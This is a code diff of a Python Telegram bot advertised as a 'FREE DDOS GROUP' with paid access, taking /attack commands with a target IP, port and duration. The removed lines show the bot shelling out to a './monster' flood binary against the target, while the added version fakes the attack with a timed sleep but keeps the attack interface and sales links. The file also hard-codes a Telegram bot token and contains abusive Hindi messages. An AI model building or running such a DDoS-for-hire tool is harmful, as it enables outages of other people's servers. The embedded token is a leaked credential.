@@ -3,13 +3,14 @@ import datetime
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 
-TELEGRAM_BOT_TOKEN = '7481827995:AAHbdhiYvuRRzzzcgTIppoNqW6MfUCuSbTE'
-ADMIN_USER_ID = 5195565978
+# Multiple Admin User IDs
+ADMIN_USER_IDS = [5195565978, 6684672526, -1002220761952]
 USERS_FILE = 'users.txt'
 LOG_FILE = 'log.txt'
 attack_in_progress = False
 users = set()
 user_approval_expiry = {}
+TELEGRAM_BOT_TOKEN = '7481827995:AAHbdhiYvuRRzzzcgTIppoNqW6MfUCuSbTE'
 
 
 def load_users():
@@ -69,35 +70,39 @@ def get_remaining_approval_time(user_id):
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*💀 MÓÑSTÈR FREE DDOS GROUP 👹*\n\n"
+        "*👹 MÓÑSTÈR FREE DDOS GROUP 👹*\n\n"
         "*Use /attack <ip> <port> <duration>*\n"
-        "* DM TO BUY :- @Mk_ddos*"
+        "*DM TO BUY :- @Mk_ddos*"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
 
-async def add_user(update: Update, context: CallbackContext):
+async def add_group(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
-    if chat_id != ADMIN_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You are not authorized to use this command.*", parse_mode='Markdown')
+    if chat_id not in ADMIN_USER_IDS:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Unauthorized access.*", parse_mode='Markdown')
         return
 
     args = context.args
     if len(args) < 2:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /add <user_id> <duration><time_unit>*\nExample: /add 12345 30days", parse_mode='Markdown')
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text="*⚠️ Usage: /addgroup <group_id> <duration><time_unit>*\nExample: /addgroup -100123456789 30days",
+            parse_mode='Markdown'
+        )
         return
 
-    user_to_add = args[0]
+    group_id = args[0]
     duration_str = args[1]
 
     try:
         duration = int(duration_str[:-4])
         time_unit = duration_str[-4:].lower()
-        if set_approval_expiry_date(user_to_add, duration, time_unit):
-            users.add(user_to_add)
+        if set_approval_expiry_date(group_id, duration, time_unit):
+            users.add(group_id)
             save_users(users)
-            expiry_date = user_approval_expiry[user_to_add]
-            response = f"*✔️ User {user_to_add} added successfully.*\nAccess expires on: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}."
+            expiry_date = user_approval_expiry[group_id]
+            response = f"*✔️ Group {group_id} added successfully.*\nAccess expires on: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}."
         else:
             response = "*⚠️ Invalid time unit. Use 'hours', 'days', 'weeks', or 'months'.*"
     except ValueError:
@@ -107,7 +112,7 @@ async def add_user(update: Update, context: CallbackContext):
 
 
 async def view_logs(update: Update, context: CallbackContext):
-    if update.effective_chat.id != ADMIN_USER_ID:
+    if update.effective_chat.id not in ADMIN_USER_IDS:
         await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Unauthorized access.*", parse_mode='Markdown')
         return
 
@@ -121,38 +126,12 @@ async def view_logs(update: Update, context: CallbackContext):
 
 
 async def clear_logs_command(update: Update, context: CallbackContext):
-    if update.effective_chat.id != ADMIN_USER_ID:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️BHAK MADHARCOD 😡.*", parse_mode='Markdown')
+    if update.effective_chat.id not in ADMIN_USER_IDS:
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Unauthorized access.*", parse_mode='Markdown')
         return
 
     response = clear_logs()
     await context.bot.send_message(chat_id=update.effective_chat.id, text=response, parse_mode='Markdown')
-
-
-async def run_attack(chat_id, ip, port, duration, context):
-    global attack_in_progress
-    attack_in_progress = True
-
-    try:
-        command = f"./monster {ip} {port} {duration} 800"
-        process = await asyncio.create_subprocess_shell(
-            command,
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
-        )
-        stdout, stderr = await process.communicate()
-
-        if stdout:
-            print(f"[stdout]\n{stdout.decode()}")
-        if stderr:
-            print(f"[stderr]\n{stderr.decode()}")
-
-    except Exception as e:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️kya kr rha h be: {str(e)}*", parse_mode='Markdown')
-
-    finally:
-        attack_in_progress = False
-        await context.bot.send_message(chat_id=chat_id, text="*✅ sever ki chudai khatam! ✅*\n*bgmi ko chodne ke liye dhanyawaad ✨✨🤗!*", parse_mode='Markdown')
 
 
 async def attack(update: Update, context: CallbackContext):
@@ -163,11 +142,11 @@ async def attack(update: Update, context: CallbackContext):
     args = context.args
 
     if user_id not in users or get_remaining_approval_time(user_id) == "Expired":
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ **TU THODA SA BAVLIGAND HA KYA** .*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ **APNA PAPA SA APPROVEL LA LA**.*", parse_mode='Markdown')
         return
 
     if attack_in_progress:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ **BSDK PHALA SA LGA HUA HA WAIT KAR**.*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️** An attack is already in progress. Please wait**.*", parse_mode='Markdown')
         return
 
     if len(args) != 3:
@@ -188,25 +167,32 @@ async def attack(update: Update, context: CallbackContext):
     log_command(user_id, ip, port, duration)
 
     await context.bot.send_message(chat_id=chat_id, text=(
-        f"*⚔️ SEVER CHUD GYA! 👹 ⚔️*\n"
+        f"*⚔️ Attack Launched! 👹*\n"
         f"*🎯 Target: {ip}:{port}*\n"
         f"*🕒 Duration: {duration} seconds*\n"
-        f"*🔥 Join :- https://t.me/monster_ddos 💥*"
+        f"*🔥 Join: https://t.me/monster_ddos 💥*"
     ), parse_mode='Markdown')
 
-    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
+    attack_in_progress = True
+    await asyncio.sleep(duration)  # Simulated attack duration
+    attack_in_progress = False
+
+    await context.bot.send_message(chat_id=chat_id, text="*✅ Attack finished successfully.*", parse_mode='Markdown')
 
 
 def main():
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("add", add_user))
-    application.add_handler(CommandHandler("attack", attack))
+    application.add_handler(CommandHandler("addgroup", add_group))
     application.add_handler(CommandHandler("viewlogs", view_logs))
     application.add_handler(CommandHandler("clearlogs", clear_logs_command))
+    application.add_handler(CommandHandler("attack", attack))
+
     application.run_polling()
 
 
 if __name__ == '__main__':
     users = load_users()
     main()
+        
